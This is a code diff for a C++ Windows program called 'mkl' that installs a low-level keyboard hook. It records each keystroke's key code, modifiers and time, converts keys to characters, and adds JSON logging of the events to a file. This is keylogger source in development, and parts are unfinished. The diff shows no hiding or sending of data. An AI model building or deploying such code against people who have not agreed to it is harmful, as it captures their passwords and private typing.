@@ -7,6 +7,10 @@
 #include <filesystem>
 namespace fs = std::filesystem;
 
+//For json:
+#include "dep/json.hpp"
+using json = nlohmann::ordered_json;
+
 //status symbols
 const char* k = "[+] ";
 const char* i = "[*] ";
@@ -16,7 +20,6 @@ const char* e = "[-] ";
 bool ctrl = false;
 bool shift = false;
 bool alt = false;
-
 
 //Create a list of keys to ignore:
 const std::vector<int> vSysKeys = {
@@ -30,10 +33,55 @@ KBDLLHOOKSTRUCT* hsData;
 
 std::string key_press_data;
 
-
 //paths:
 fs::path pSelf;
 fs::path pOut;
+
+//json file
+json data;
+std::string sJsonVersion = "0.0.0.1";
+int iEventCount = 0;
+
+void addEvent(int code, bool mods[], int time){
+	iEventCount += 1;
+
+	//create event
+	json event = {
+		{"id", iEventCount},
+		{"code", code},
+		{"mods", {
+			{"shft", mods[0]},
+			{"ctrl", mods[1]},
+			{"alt", mods[2]}}
+		},
+		{"time", time}
+	};
+
+	//Check for output file
+	if (fs::exists(pOut)){
+		//read in from file
+		std::ifstream in(pOut.string());
+		in >> data;
+	} 
+	else {
+		//Cannot find file, re-init
+		std::cout << e << "Cannot find output file, re-initializing...: " << GetLastError() << std::endl;
+
+		//re-init
+		data["app"] = "mkl";
+		data["version"] = sJsonVersion;
+		data["events"] = json::array();
+	}
+
+	//Add event to events
+	data["events"].push_back(event);
+
+	//Write to file:
+	std::ofstream out(pOut);
+	out << data.dump(4);
+
+}
+
 
 
 //Callback function for the hook!
@@ -114,23 +162,40 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 			//print to terminal:
 			std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;
 
+			bool mods[3] = {shift, ctrl, alt};
 
+			//addEvent(data.vkCode, mods, data.time);
 
-			//create/ref file
-			std::ofstream MyFile(pOut);
+			//Keyboard State
+			BYTE bKeyStates[256];
 
-			if (MyFile.is_open()) {
-				//write to file:
-				MyFile << "{\n\t\"vkCode\": \"" << data.vkCode << "\",\n\t\"mods\": {\"shft\": "<< shift <<", \"ctrl\": "<< ctrl <<", \"alt\": "<< alt <<"},\n\t\"time\": "<< data.time << ",\n},\n";
-				MyFile.close();
-			}
+			//write to keyStates
+			GetKeyboardState(bKeyStates);
 
-			////Build json format:
-			//key_press_data = {
-			//	"vkCode": data.vkCode,
-			//	"Mods": {"shft": shift, "ctrl": ctrl, "alt": alt},
-			//	"time": data.time
+			WCHAR pwszBuff[8];
+			int iBuffSize = 8;
+			int iFlags = 2;
+
+			//Testing with ToInt 
+			int result = ToUnicode(data.vkCode, data.scanCode, bKeyStates, pwszBuff, iBuffSize, iFlags);
+
+			//std::cout << i << *pwszBuff << std::endl; 
+
+			//Temp Solution:
+			//char ascii = (char)pwszBuff[0];
+
+			//for (int i = 0; i < 8; i++){
+			char ascii = (char)pwszBuff[0];
+			//	std::cout << ascii;
 			//}
+
+
+			std::cout << ascii << std::endl;
+
+			//Convert to UTF-8
+
+
+			//WideCharToMultiByte(CP_UTF8, 0, *pwszBuff, sizeof(*pwszBuff), out.)
 
 		}
 	}
@@ -162,6 +227,33 @@ int main(int argc, char* argv[]){
 		std::cout << i << pOut.filename() << " does not exist, it will be created." << std::endl;
 	} 
 	else {std::cout << k << pOut.filename() << " found." << std::endl;}
+
+
+	// === Init Json ===
+	data["app"] = "mkl";
+	data["version"] = sJsonVersion;
+
+	//Make events array
+	data["events"] = json::array();
+
+	//Write to file:
+	std::ofstream out(pOut);
+	if (!out.is_open()) {
+		std::cout << e << "Unable to open file: " << GetLastError() << std::endl;
+		return 1;
+	}
+	
+	out << data.dump(4);
+	
+	if (out.fail()) {
+		std::cout << e << "Init write Failed: " << GetLastError() << std::endl;
+		return 1;
+	}
+
+	std::cout << k << "Init write success!" << std::endl;
+
+	out.close();
+	// =================
 
 
 
